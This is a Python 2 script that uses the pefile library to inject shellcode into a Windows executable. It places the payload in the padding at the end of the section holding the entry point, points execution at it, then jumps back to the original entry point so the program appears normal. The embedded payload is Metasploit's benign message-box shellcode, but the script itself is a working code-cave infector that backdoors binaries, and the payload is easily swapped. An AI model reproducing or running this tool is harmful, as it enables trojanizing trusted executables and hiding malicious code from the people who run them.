from pefile import PE
from struct import pack
# windows/messagebox - 265 bytes
# http://www.metasploit.com
# ICON=NO, TITLE=W00t!, EXITFUNC=process, VERBOSE=false, 
# TEXT=Debasish Was Here!
sample_shell_code = ("\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" +
"\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" +
"\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" +
"\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" +
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" +
"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" +
"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" +
"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" +
"\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" +
"\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" +
"\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" +
"\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" +
"\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55" +
"\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8" +
"\x61\xff\xff\xff\x68\x21\x58\x20\x20\x68\x57\x30\x30\x74" +
"\x31\xdb\x88\x5c\x24\x05\x89\xe3\x68\x65\x21\x58\x20\x68" +
"\x20\x48\x65\x72\x68\x20\x57\x61\x73\x68\x73\x69\x73\x68" +
"\x68\x44\x65\x62\x61\x31\xc9\x88\x4c\x24\x12\x89\xe1\x31" +
"\xd2\x52\x53\x51\x52\xff\xd0")
if __name__ == '__main__':
	exe_file = raw_input('[*] Enter full path of the main executable :')
	final_pe_file = raw_input('[*] Enter full path of the output executable :')
	pe = PE(exe_file)
	OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	pe_sections = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	align = pe.OPTIONAL_HEADER.SectionAlignment
	what_left = (pe_sections.VirtualAddress + pe_sections.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
	end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
	padd = align - (end_rva % align)
	e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
	scode_size = len(sample_shell_code)+7
	if padd < scode_size:
		# Enough space is not available for shellcode
		exit()
	# Code can be injected
	scode_end_off = e_offset
	scode_start_off = scode_end_off - scode_size
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
	raw_pe_data = pe.write()
	jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
	sample_shell_code = '\x60%s\x61\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	final_data = list(raw_pe_data)
	final_data[scode_start_off:scode_start_off+len(sample_shell_code)] = sample_shell_code
	final_data = ''.join(final_data)
	raw_pe_data = final_data
	pe.close()
	new_file = open(final_pe_file, 'wb')
	new_file.write(raw_pe_data)
	new_file.close()
	print '[*] Job Done! :)'